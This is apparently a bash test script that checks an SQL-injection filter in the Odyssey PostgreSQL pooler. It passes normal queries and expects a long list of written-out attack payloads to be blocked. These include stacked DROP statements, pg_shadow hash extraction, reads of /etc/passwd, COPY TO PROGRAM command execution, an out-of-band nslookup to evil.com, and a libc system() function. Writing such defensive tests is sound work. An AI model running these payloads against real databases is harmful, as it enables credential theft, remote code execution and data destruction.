#!/bin/bash

set -ex

/usr/bin/odyssey /tests/sqli_guard/odyssey.conf
sleep 1

CONNSTR='host=localhost port=6432 user=postgres dbname=postgres'
PASS=0
FAIL=0

check_blocked() {
	local desc="$1"
	local query="$2"
	local out
	out=$(psql "$CONNSTR" -c "$query" 2>&1) || true
	if echo "$out" | grep -q "query blocked by security policy"; then
		echo "PASS (blocked): $desc"
		PASS=$((PASS + 1))
	else
		echo "FAIL (not blocked): $desc"
		echo "  query: $query"
		echo "  output: $out"
		FAIL=$((FAIL + 1))
	fi
}

check_allowed() {
	local desc="$1"
	local query="$2"
	local expect="$3"
	local out
	out=$(psql "$CONNSTR" -c "$query" 2>&1)
	if echo "$out" | grep -q "$expect"; then
		echo "PASS (allowed): $desc"
		PASS=$((PASS + 1))
	else
		echo "FAIL (unexpectedly blocked or wrong output): $desc"
		echo "  query: $query"
		echo "  output: $out"
		FAIL=$((FAIL + 1))
	fi
}

# === Queries that SHOULD PASS (legitimate SQL) ===

check_allowed "normal SELECT" \
	"SELECT 1 AS normal_query;" "normal_query"

check_allowed "normal SELECT with WHERE" \
	"SELECT 'hello' AS greeting WHERE 1=1;" "hello"

check_allowed "normal function call" \
	"SELECT length('hello');" "5"

check_allowed "normal aggregate query" \
	"SELECT count(*) FROM pg_class WHERE relkind='r';" "count"

# === Stacked queries (category: stacked injection) ===

check_blocked "stacked DROP TABLE" \
	"SELECT 1; DROP TABLE users;"

check_blocked "stacked DELETE after quote escape" \
	"'; DELETE FROM users;"

check_blocked "stacked CREATE via injection" \
	"'; CREATE TABLE pwned(data text);"

# === UNION-based injection ===

check_blocked "UNION SELECT" \
	"SELECT 1 UNION SELECT usename FROM pg_user;"

check_blocked "UNION ALL SELECT" \
	"SELECT id FROM pg_class UNION ALL SELECT usename FROM pg_user;"

# === Error-based injection ===
# These use CAST/information_schema to extract data

check_blocked "information_schema.tables enumeration" \
	"SELECT table_name FROM information_schema.tables LIMIT 1;"

check_blocked "information_schema.columns enumeration" \
	"SELECT column_name FROM information_schema.columns WHERE table_name='pg_user';"

check_blocked "pg_shadow password hash extraction" \
	"SELECT usename, passwd FROM pg_shadow;"

# === Time-based blind injection ===

check_blocked "pg_sleep time-based" \
	"SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END;"

check_blocked "pg_sleep simple" \
	"SELECT 1 FROM pg_sleep(10);"

# === File read (PostgreSQL file manipulation) ===

check_blocked "pg_read_file" \
	"SELECT pg_read_file('/etc/passwd', 0, 200);"

check_blocked "lo_import file read" \
	"SELECT lo_import('/etc/passwd');"

# === File write ===

check_blocked "lo_export file write" \
	"SELECT lo_export(12345, '/tmp/evil.sh');"

check_blocked "lo_from_bytea" \
	"SELECT lo_from_bytea(43210, 'malicious data');"

# === Command execution (COPY TO/FROM PROGRAM) ===

check_blocked "COPY FROM PROGRAM" \
	"COPY shell FROM PROGRAM 'cat /etc/passwd';"

check_blocked "COPY (SELECT) TO PROGRAM" \
	"COPY (SELECT '') TO PROGRAM 'whoami';"

# === Out-of-band via COPY PROGRAM ===

check_blocked "COPY TO PROGRAM nslookup" \
	"COPY (SELECT '') TO PROGRAM 'nslookup evil.com';"

# === CREATE FUNCTION with C language (RCE via libc) ===

check_blocked "CREATE FUNCTION C language RCE" \
	"CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;"

# === XML helpers for data exfiltration ===

check_blocked "query_to_xml data exfiltration" \
	"SELECT query_to_xml('select * from pg_user', true, true, '');"

check_blocked "database_to_xml full dump" \
	"SELECT database_to_xml(true, true, '');"

# === Authentication bypass patterns ===

check_blocked "OR 1=1 bypass" \
	"SELECT * FROM pg_class WHERE relname='' OR '1'='1';"

check_blocked "AND 1=1 tautology" \
	"SELECT * FROM pg_class WHERE relname='x' AND '1'='1';"

# === DROP / TRUNCATE variants ===

check_blocked "DROP TABLE" \
	"DROP TABLE users;"

check_blocked "DROP DATABASE" \
	"DROP DATABASE production;"

check_blocked "TRUNCATE TABLE" \
	"TRUNCATE TABLE users;"

check_blocked "DROP SCHEMA" \
	"DROP SCHEMA public CASCADE;"

# === Verify odyssey log contains blocked entries ===
grep -q "query blocked by sqli_guard_regex" /var/log/odyssey.log || {
	echo "FAIL: no blocked queries found in odyssey log"
	FAIL=$((FAIL + 1))
}

echo ""
echo "=== Results: $PASS passed, $FAIL failed ==="

if [ "$FAIL" -gt 0 ]; then
	exit 1
fi

ody-stop
